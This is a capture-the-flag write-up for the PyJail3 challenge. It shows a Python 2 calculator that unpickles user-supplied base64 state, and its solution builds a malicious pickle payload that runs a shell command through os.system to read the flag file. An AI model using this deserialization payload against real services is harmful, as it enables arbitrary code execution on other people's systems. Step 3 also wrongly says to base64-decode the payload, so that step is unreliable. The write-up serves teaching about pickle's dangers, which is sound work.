# [PyJail3](http://s1063.vdi.mipt.ru:8000/challenges#PyJail3)
You can find flag in `/home/pyjail3/flag.txt`

```python
#!/usr/bin/python2.7 -u
import pickle
import base64

def print_history(state):
    print 'Count: ' + str(len(state))
    for key in state:
        print key + ' = ' + str(state[key])

def export_state(state):
    print 'Your state: '+base64.b64encode(pickle.dumps(state))

def import_state(encoded_state):
    global state
    state = pickle.loads(base64.b64decode(encoded_state))

def evaluate(expr, state):
    for c in expr:
        if c not in whitelist:
            print("Go away!")
            exit(0)

    result = eval(expr)
    state[expr] = result
    print(expr + " = " + str(result))

print("Calculator v0.2")

whitelist = '0123456789.+-*/^%()&| '

menu = '''calc <expr> - evaluate expression
import <state> - load your state
export - print current encoded state
history - print your history
quit - exit from application'''

state = {}

while True:
    print menu
    choice = raw_input('> ')
    if choice == 'export':
        export_state(state)
        continue
    elif choice == 'quit':
        exit(0)
    elif choice == 'history':
        print_history(state)
        continue

    if ' ' not in choice:
        print 'Invalid command'
        continue

    command, arg = choice.split(' ', 1)
    if command == 'import':
        import_state(arg)
    elif command == 'calc':
        evaluate(arg, state)
    else:
        print 'Invalid command'

```

# Solution
1. Pickle is a module implements binary protocols for serializing and de-serializing a Python object structure. In the official docs there is some interesting stuff:
**Warning**: The pickle module is not secure. Only unpickle data you trust.
It is possible to construct malicious pickle data which will execute arbitrary code during unpickling. 
Never unpickle data that could have come from an untrusted source, or that could have been tampered with.
On github we can find the [source1](https://github.com/python/cpython/blob/master/Lib/pickle.py) and [source2](https://github.com/python/cpython/blob/master/Lib/pickletools.py). The most interesting part is opcodes:
```python
# Pickle opcodes.  See pickletools.py for extensive docs.  The listing
# here is in kind-of alphabetical order of 1-character pickle code.
# pickletools groups them by purpose.

MARK           = b'('   # push special markobject on stack
GLOBAL         = b'c'   # push self.find_class(modname, name); 2 string args
STOP           = b'.'   # every pickle ends with STOP
REDUCE         = b'R'   # apply callable to argtuple, both on stack
STRING         = b'S'   # push string; NL-terminated string argument
TUPLE          = b't'   # build tuple from topmost stack items
```

2. We need create a pickle string that execute some code while loads. For example: 
```
cos
system
(S'cat /home/pyjail3/flag.txt'
tR.
```
3. Then decode it with base64 and import in python program. When it will be loaded pickle execute bash code and prints flag:

**Answer**: `flag{p1ckl3_is_n0t_s4fe_ser1alizati0n_plz_use_js0n}`